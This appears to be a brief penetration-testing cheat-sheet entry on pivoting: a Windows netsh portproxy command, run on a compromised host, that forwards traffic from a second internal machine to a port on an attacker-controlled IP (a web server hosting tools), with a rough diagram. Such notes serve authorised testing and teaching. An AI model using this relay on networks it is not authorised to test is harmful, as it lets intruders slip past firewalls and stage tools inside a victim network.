
Below is port forwarding syntax allowing us to forward traffic back to a port on our attacker (e.g., access to a simple web server hosting tools)

```powershell
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=<client_port> connectaddress=<attacker_ip> connectport=<attacker_port>
```

Above code would be running on a compromised <client_01> and allow <client_02> to reach a specified port on our attacker box. 

Shitty Diagram Below:
```
	                    | FW |
<client_02> ---> <client_01>:<port> ---> <attacker_ip><port>
						| FW |
```
